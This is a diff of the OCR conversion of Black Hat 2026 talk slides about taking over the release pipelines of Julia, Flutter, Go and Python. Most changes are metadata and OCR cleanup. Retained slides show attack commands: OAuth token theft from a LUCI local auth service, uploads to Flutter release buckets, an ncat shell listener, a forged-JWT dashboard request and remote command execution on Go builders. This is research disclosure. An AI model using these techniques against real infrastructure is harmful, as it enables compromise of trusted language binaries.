@@ -8,19 +8,24 @@ year: 2026
 source_pdf: "BlackHat_USA_2026_Slides/Splitline Ng_Born Corrupted How We Backdoored Trusted Language Binaries.pdf"
 pages: 174
 sha256: "650f71794f9f75a72c0a9da640c72eb71767d40fe51c4fd869a1b83e46c875a8"
-text_chars: 55527
-ocr_pages: 36
+text_chars: 52112
+ocr_pages: 34
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 86.8
+ocr_unreliable_blocks: 2
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 3
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T23:17:06Z"
+converted_at: "2026-08-12T05:46:07Z"
 ---
 # Born Corrupted How We Backdoored Trusted Language Binaries
 
 **Speakers:** Splitline Ng  
 **Conference:** Black Hat USA 2026  
 **Source:** `BlackHat_USA_2026_Slides/Splitline Ng_Born Corrupted How We Backdoored Trusted Language Binaries.pdf` (174 pages)
+
 
 ## Slide 1
 
@@ -62,11 +67,11 @@ $ whois **splitline** .tw Security Researcher @ DE✓CORE. Member of UNDEFINED C
 
 ## Slide 10
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 we) axios / axios ~
-Q Type (/) to search
 Code ©) Issues 47
 7) Pullrequests 19 G Agents ) Discussions ©) Actions © Security and quality 39 l~ Insights
 axios@1.14.1 and axios@0.30.4 are compromised #10604
@@ -80,7 +85,8 @@ Most likely, a maintainer's GitHub and npm accounts are compromised as these iss
 
 ## Slide 11
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 we) axios / axios ~ Q Type (/) to search
@@ -96,18 +102,18 @@ Most likely, a mainta
 | have also reported
 May 19,2026 / 5minread X 8 AA
 » echarts-for-react 0% (200) 100) (ico)
-TS SERS CON ee PON TO Supply Chain Vulnerability Quality Maintenance _License
 latest Source [Jnpm Copy purl @ Security
 ```
 
 ## Slide 12
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 TrapDoor Supply Chain Attack Spreads Credential-Stealing Malware via
 npm, PyPI, and CrateslO
-& RavieLakshmanan  @ May 25, 2026 Supply Chain Attack / Malware
+& RavieLakshmanan @ May 25, 2026 Supply Chain Attack / Malware
 Top Stories This Week
 New Bit2Watt Attack Could Let Cloud
 Tenants Disrupt Power Grids Without an
@@ -129,26 +135,22 @@ and Crates.io to distribute credential-stealing malware. Letting Authenticated U
 Commands as Git
 Agobe Acrobat Extension Flaw Let
 The campaign, codenamed TrapDoor, spans more than 34 malicious packages across over 384
-wy
-—_ = echarts-for-react
 0%
 Apache Echarts components for React.
 Supply Chain Vulnerability Quality Maintenance
-source np — Copy pur! co IEREESCS Security
->
-OD
 License
 to search
 ```
 
 ## Slide 13
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 TrapDoor Supply Chain Attack Spreads Credential-Stealing Malware via
 npm, PyPI, and CrateslO
-& RavieLakshmanan  @ May 25, 2026 Supply Chain Attack / Malware
+& RavieLakshmanan @ May 25, 2026 Supply Chain Attack / Malware
 +(7) to search
 =O
 Top Stories This Week
@@ -316,11 +318,28 @@ Developer� CI/CD�Risks ??? Dashboard Attack Surfaces
 
 ## Slide 31
 
-Developer� CI/CD�Risks ??? Dashboard Attack Surfaces
+CI/CDRisks
+Developer
+Dashboard
+???
+Attack Surfaces
+Web Hacking
+Access Control
+Insuff. Flow Control
+Poisoned Pipeline
 
 ## Slide 32
 
-Developer� CI/CD�Risks ??? Dashboard Attack Surfaces
+CI/CDRisks
+Developer
+Dashboard
+???
+Attack Surfaces
+Web Hacking
+Access Control
+Insuff. Flow Control
+Poisoned Pipeline
+Let's Think!
 
 ## Slide 33
 
@@ -328,13 +347,12 @@ julia 1
 
 ## Slide 34
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-= €) wutiatang 1 julia - Q Br &y+ +v//@©]/%)|/@ Q <a>
 Code Issues 3.7k Pull requests 977 Agents Discussions Actions More v
 Filters » Q is:pris:open © Labels 181 [> Milestones 5 New pull request
-12.976 Open Y 33,525 Closed
 Author ~ Label ~ Projects ~ Milestones ~ Reviews ~,
 ```
 
@@ -342,11 +360,11 @@ Author ~ Label ~ Projects ~ Milestones ~ Reviews ~,
 
 Takeover What You Download!
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ju | la Download Docs Learn Blog Community
-=O
 Code ls
 v1.12.6 (April 9, 2026)
 Filters +
@@ -360,16 +378,15 @@ https://julialang-s3.julialang.org/bin/mac/aarch64/1.12/julia-1.12.6-macaarch64.
 
 ## Slide 36
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ju | la Download Docs Learn Blog Community
-q
 Code Is
 v1.12.6 (April 9, 2026)
 Release notes | GitHub tag | Sag
 Filters +
-Oe
 macOS (Intel x86) [help]
 https://julialang-s3.julialang.org/bin/mac/aarch64/1.12/julia-1.12.6-macaarch64.dmg
 ```
@@ -541,13 +558,13 @@ Flutter 2
 
 ## Slide 59
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 = ©) flutter / flutter ~
 Code Issues 5k+ Pull requests
 Filters » Q is:pris:open
-3% 518 Open Y 72,681 Closed
 Author + Label + Projects +
 518
 Q 8
@@ -564,7 +581,8 @@ Sort ~
 
 ## Slide 60
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Install manually
@@ -581,7 +599,6 @@ Uninstall SDK flutter_windows_3.44.8-stable.zip
 Filters » Q is:pris
 (© Resources v
 2 Create gz r to store the SDK
-$3 .5180pen - 72,63
 https://storage.googleapis.com/flutter_infra_release/releases/stable/windq windows_3.44.8-stable.zip ,
 Author + Label + Projects ~ Milestong
 ```
@@ -756,7 +773,8 @@ timeout: 60 properties: # ... tags: > final content = await githubFileContent( [
 
 ## Slide 77
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Roll Skia from f886711f9453 to fe9e9f229487 (4 revisions) #1
@@ -768,7 +786,6 @@ screenshots.
 List which issues are fixed by this PR. You must list at least one issue. An issue is n¢ PR fixes something
 trivial like a typo.
 If you had to change anything in the flutter/tests repo, include a link to the mig aking change
-policy. '
 ```
 
 ## Slide 78
@@ -777,21 +794,19 @@ final content = await githubFileContent( slug, ciYamlPath, // ".ci.yaml" ref: co
 
 );
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ee0e 8 rlwrap (ssh)
 id
-uid=10@@Cchrome-bot) gid=1@@@Cchrome-bot) groups=1000Cchrome-bot) ,109Ckvm)
 ip addr
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
-Llink/Loopback @@:00:00:2@:00:00 brd 00:00:200:00:00:20
 inet 127.0.0.1/8 scope host lo
 valid_lft forever preferred_lft forever
 inet6 ::1/128 scope host
 valid_lft forever preferred_lft forever
 2: ens4: <BROADCAST ,MULTICAST,UP,LOWER_UP> mtu 146@ qdisc mq state UP group default qlen 1000
-link/ether 42:01:0a:80:08:49 brd ff: ff: ff: ff: fF: fF
 inet 10.128.0.73/32 metric 10@ scope global dynamic ens4
 valid_lft 3264sec preferred_lft 3264sec
 inet6 fe8&@: :4001:aff:fe80:49/64 scope link
@@ -807,7 +822,8 @@ PID TTY TIME CMD
 
 ## Slide 79
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 77/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 eee a (s} rlwrap (ssh) #2
@@ -815,39 +831,30 @@ id
 uid=100@Cchrome-bot) gid=100@Cchrome-bot) groups=1000Cchrome-bot) ,109Ckvm)
 curl -s -X POST \
 -H "Content-Type: application/json" \
--d "{
 \"scopes\": [
 \"https://www.googleapis.com/auth/cloud-platform\",
-\"https://www.googleapis.com/auth/datastore\"
-J ¥
 \"secret\": \"ik/ORYUTeygi5+wB8g1/niL91PxVgQP84zDmt TUG726M7Nc fdzDMVeRGXXLVmSXU\" ,
 \"account_id\": \"task\"
-t" \
 "http://127.0.0.1:39979/rpc/LuciLocalAuthService. GetOAuthToken"
 ```
 
 ## Slide 80
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-eee & splitline@splitlinedeMacBook-Pro:~
 + ~ curl -sS -X POST \
 -H "Authorization: Bearer $TOKEN" \
 -H "Content-Type: text/plain" \
 --data 'pwned'" \
-"https://storage.googleapis.com/upload/storage/v1/b/flutter_archives_v2/o?upLloadTy
 "kind": "storage#object”,
 "id": "flutter_archives_v2/downLoad.flutter.io/io0/pwned.txt/1772713469572856",
 "selfLink": "https://www.googleapis.com/storage/v1/b/flutter_archives_v2/o/downLoc
-"mediaLink": "https://storage.googleapis.com/downLload/storage/v1/b/f Lutter_archive
 eneration=1772713469572856&alt=media",
-"name": "download. flutter.10/io/pwned.txt",
-"pucket": "“flutter_archives_v2",
 "generation": "1772713469572856",
 "“metageneration”: "1",
 "contentType": "text/plain",
-"storageClass": "STANDARD",
 "size": "5",
 ou © 3/05, 8:27PM s
 ```
@@ -856,10 +863,10 @@ ou © 3/05, 8:27PM s
 
 Write to gs://flutter_archives_v2
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-© _shttps:/jwww.googleapis.com/downlo X ++
 S G ~ https://www.googleapis.com/download/storage/v1/b/flutter_archives_v2/o/download.flutter.io%2Fio%2Fpwned.txt?
 pwned
 Write to gs://flutter_archives v2
@@ -874,12 +881,10 @@ Write to gs://flutter_archives v2
 
 Write to gs://flutter_archives_v2
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-https://www.googleapis.comjdownlo X +
-G ~ https://www.googleapis.co! wn fflutter_arc load.flutter.io%2!
-ae Pwned?
 Write to gs://flutter_archives v2
 "storageClass": "STANDARD",
 "size": "5",
@@ -1019,12 +1024,11 @@ Job#1 Job#2 Local Auth RPC Job#3 mount_cache('builder') … _cache_path('builder
 
 **Cocoon Flutter Build Dashboard**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-~<
 Flutter Build Dashboard — Cocoon
-x Build
 PreSubmit
 Manual Tree Status
 Framework Benchmarks
@@ -1032,7 +1036,6 @@ Engine Benchmarks
 Source Code
 About Flutter Build Dashboard —
 Cocoon
-(Groyererela
 Flutter Build Dashboard
 ```
 
@@ -1054,7 +1057,8 @@ Future<TokenInfo> decodeAndVerify(String jwtString) async { final now = _now(); 
 
 ## Slide 97
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 eee «2 8 rlwrap (ssh) * ..-Sec/_reports (-zsh)
@@ -1072,7 +1076,8 @@ User is not signed ing
 
 ## Slide 98
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 60/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 eee 8 P| «.-Sec/_reports (-zsh)
@@ -1087,26 +1092,17 @@ via: 1.1 google
 alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
 User is not signed ing
 + _reports curl -s -H "X-Flutter-IdToken: $(python forge_cocoon_jwt.py)" "https://flutter-dashboard.appspot.com/api/get-
-[{"createdOn" : "2026-02-09T20:54:51.478050Z" "status": "success", "author": "codefu@google.com","reason":"Github Looks normal
-"2026-02-09T19 :03:48.170224Z" ,"status":"failure", "author": "codefu@google.com","reason":"GitHub Actions Failing"},{"created
-6972", "status":"success", "author": "codefu@google.com", "reason": "GitHub normal"}, {"createdOn" :"2026-02-09T16:35:28.308656Z"
-:"codefu@google.com", "reason": "GitHub outage"},{"createdOn" :"2026-02-03T00:44:54.958181Z" "status": "success", "author": "jtm
-ooks like actions are running again"}, {"createdOn" :"2026-@2-@2T22:32:13.848204Z","status":"failure", "author": "codefu@googl
-ons Outage"},{"createdOn" :"2025-11-26T22:48:54.819921Z", "status": "success", "author": "Loicsharma@google.com", "reason": "LSC
-hub. com/flutter/flutter/issues/178827"}, {"createdOn":"2025-11-25T16:06:10.0111022", "status": "failure", "author": "katelovett
 ng for LSC - lints https://github.com/flutter/flutter/issues/178827"}, {"createdOn" :"2025-@7-07T19:27:05 .346994Z" "status":
-oogle.com","reason":"format has concluded "},{"createdOn":"2025-07-07T15:11:39.745121Z" "status": "failure", "author": "matan
 duled Dart format 3.8"}12
 + _reports |
 ```
 
 ## Slide 99
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-@@@ <2 Oriwrap ncat -ivp 7414
-uid=10@@Cchrome-bot) gid=10@@Cchrome-bot) groups=10@@Cchrome-bot) ,109Ckvm)
 TOKEN=$CLuci-auth token -scopes https://www.googleapis.com/auth/cloud-platform)
 for B in flutter_infra_release download.flutter.io flutter_archives_v2; do
 echo "$B: $Ccurl -s -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/s
@@ -1119,7 +1115,8 @@ flutter_archives_v2: storage.objects.create
 
 ## Slide 100
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 @@@ #2 Oriwrap ncat -Ivp 7414
@@ -1131,7 +1128,6 @@ ge.objects.create" | grep -o 'storage.objects.create')"
 done
 flutter_infra_release: storage.objects.create
 download.flutter.io: storage.objects.create
-flutter_archives_v2: storage.objects.creoks
 ```
 
 ## Slide 101
@@ -1144,12 +1140,10 @@ Golang 3
 
 ## Slide 103
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 74/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-is CG 23 https://gomote.golang.org
-Gomote Serv++
-.
 CG 25 https://build.golang.org
 Name [master v] CO show only first-class ports
 drchase-gotip-linux-arr
@@ -1157,7 +1151,6 @@ drchase-gotip-linux-arr
 Go
 darwin
 amd64 amd64 amd64 amd64 amd64 arm64 arm64 arm64 arm64 arm64 386
-13-% 14-% 15-%, longtest nocgo- 143-%, 14-%, 15-%, 26-%, longtest clangiS
 6db72bb jorro... 25 Jul 13:25 cmd/compile: remove... ok ok ok ok fail ok ok ok ok ok ok
 af4b@2c jorro... 25 Jul 13:24 cmd/compile: donot... ok ok ok ok fail ok ok ok ok ok ok
 Zb4aab8 sam... 25 Jul 03:27 internal/strconv: rem... ok ok ok ok fail ok ok ok ok ok ok
@@ -1221,7 +1214,8 @@ return nil, fmt.Errorf( " idtoken: audience does not match " )
 
 ## Slide 108
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 go / build / 8cc3517581090ba52a473fc0602e02169929d921
@@ -1242,7 +1236,8 @@ Updates golang/go#48742
 
 ## Slide 109
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 go / build / 8cc3517581090ba52a473fc0602e02169929d921
@@ -1254,7 +1249,6 @@ parent
 8cc3517581090ba52a473fc0602e02169929d921 [log] [tgz]
 Carlos Amedee <carlos@golang.org> Fri Jan 14 10
 Carlos Amedee <carlos@golang.org> Sat Jan 15 00
-84a37675b293c344e243c08300cc322682F8792d
 09d18253d412a5a6c4177d5056a968953fe6269e [diff]
 internal/access, cmd/coordinator: add option to disable audience check
 This change adds the option to skip the validation of the audience
@@ -1265,10 +1259,10 @@ Updates golang/go#48742
 
 ## Slide 110
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-YY cmd/coordinator/coordinator.go i) ap
 346
 347
 348
@@ -1285,8 +1279,6 @@ YY cmd/coordinator/coordinator.go i) ap
 351
 352
 353
-ay
-oe
 @@ -346,8 +346,
 if serviceID = env. IAPServiceID(coordinatorBackend); serviceID == "" {
 log.Fatalf("unable to retrieve Service ID for backend service=%q", coordinatorBackend)
@@ -1295,13 +1287,10 @@ opts =
 8 @@ func main() {
 append(opts,
 +2 -2 8820
-grpc.UnaryInterceptor(access.RequireIAPAuthUnaryInterceptor(access.IAPAudienceGCE(env.ProjectNumber, serviceID))))
 opts =
-grpc.StreamInterceptor(access.RequireIAPAuthStreamInterceptor(access.IAPAudienceGCE(env.ProjectNumber, serviceID) )))
 opts =
 grpc.UnaryInterceptor(access.RequireIAPAuthUnaryInterceptor(access.IAPSkipAudienceValidation) ) )
 opts =
-grpc.StreamInterceptor(access.RequireIAPAuthStreamInterceptor (access. IAPSkipAudienceValidation) ) )
 }
 append(opts,
 append(opts,
@@ -1314,27 +1303,13 @@ grpcServer
 
 ## Slide 111
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-YY cmd/coordinatons =
-apskipaudienceValidation)
-LT
-+ requireIAPAuthUnaryInterceptor (acces®
-rreecaci\ unable
-et
-opts = append(opts,
-grpc.UnaryInterceptor(access.RequireIAPAuthUnaryInterceptor (access. IAPSkipAudienceValidation) ) ) lt
-_ opts = append(opts,
-Beto rceptor(access.RequireIAPAuthStreamIntercept
-n't factored
-otherwise.
-grpcServer := grpc.NewServer(opts...
-```
+- RequireIAPAuthUnaryInterceptor(access.IAPAudienceGCE(env.ProjectNumber, serviceID))
++ RequireIAPAuthUnaryInterceptor(access.IAPSkipAudienceValidation)
 
 ## Slide 112
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Go Build Coordinator Performance Das
@@ -1368,7 +1343,8 @@ illumos-amd64
 
 ## Slide 113
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 74/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 eee & splitline@splitlinedeMacBook-Pro:~/golang-cicd-sec/poc/poc
@@ -1377,14 +1353,11 @@ eee & splitline@splitlinedeMacBook-Pro:~/golang-cicd-sec/poc/poc
 --app-url ‘https://serene-smoke-244105.uc.r.appspot.com/' \
 --sa ‘iap-tester@serene-smoke-244105.1am.gserviceaccount.com' \
 --project 'serene-smoke-244105' \
-2>/dev/null)
 echo "${IAP_JWT:0:120}..."
-eyJhbGci Oi JFUZI1NiIsInR5cCI6IkpXVCIsImtpZCI6In1Vd2pWZyJ9. eyJhdWQi0i LvcHJ vamV j dHMvMzE40TAQN jM1NjgSL2FwcHMvc2VyZWSLLXNtb2t...
 )+ poc go run . -target gomotessh.golang.org:443 -jwt "$IAP_JWT" create gol.25-Linux-amd64
 [*] Waiting (@ ahead)...
 [+] Created iap-tester-gol.25-Linux-amd64-@ (Cbuilder=go1.25-linux-amd64, host=swarming task)
 )+ poc go run . -target gomotessh.golang.org:443 -jwt "$IAP_JWT" -sys exec iap-tester-gol.25-Linux-amd64-@ -- bash -c "id; uname -a"
-uid=100@Cswarming) gid=100@Cswarming) groups=1000Cswarming)
 Linux golang-ciw-n1-1linux-x86-bullseye-us-centrall-b-Q-vvxv 6.1.161+ #1 SMP PREEMPT_DYNAMIC Sat Feb 7 20:26:32 UTC 2026 x86_64 GNU/Li
 ```
 
@@ -1690,7 +1663,8 @@ chromium-swarm.appspot.com
 
 ## Slide 131
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 x/build/internal/gomote: explore destroying the bot after a gomote
@@ -1798,7 +1772,8 @@ Python 4
 
 ## Slide 146
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 how to install python
@@ -1812,7 +1787,8 @@ Now." 2
 
 ## Slide 147
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 how to install python
@@ -1826,12 +1802,11 @@ Now." 2
 
 ## Slide 148
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-G 25 https://www.python.org/downloads/ *&
 Python
-e python ,
 About Downloads Documentation Community Success Stories News Events
 Download the latest version for macOS
 Download Python 3.14.6
@@ -1843,11 +1818,11 @@ Docker images
 
 ## Slide 149
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 25 https://www.python.org/downloads/
-e python ,
 About Downloads Documentation Community Success Stories News Events
 Download the latest version for macOS
 Download Python 3.14.6
@@ -1861,28 +1836,26 @@ Docker images
 
 WHAT?
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-G £3 https://www.python.org/downloads/
 Python
-e python ,
 About Downloads Documentation Community Success Stories News Events
 Download the latest version for macOS
 Download Python 3.14.6 -
 Looking for Pvthon with a different OS? Pvthon for Windows,
 WHAT?
-fo \
 ```
 
 ## Slide 151
 
 WHAT?
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-25 ttps://www.python.org/downloads/
 Download Python 3.14.6
 Looking for Pvthon with a different 04
 ```
@@ -1909,7 +1882,8 @@ HTTP/1.1
 
 ## Slide 155
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Code Issues 65 Pullrequests 44 Agents Actions Projects Security and quality Insights
@@ -2019,14 +1993,3 @@ So, did you use any AI? Yes, quite a few.
 Thanks!
 
 splitline@devco.re @_splitline_
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-DEVCORE
-Thanks!
-WA solitlineQdevco.re
-X @_soplitline_
-black hat
-2026
-```
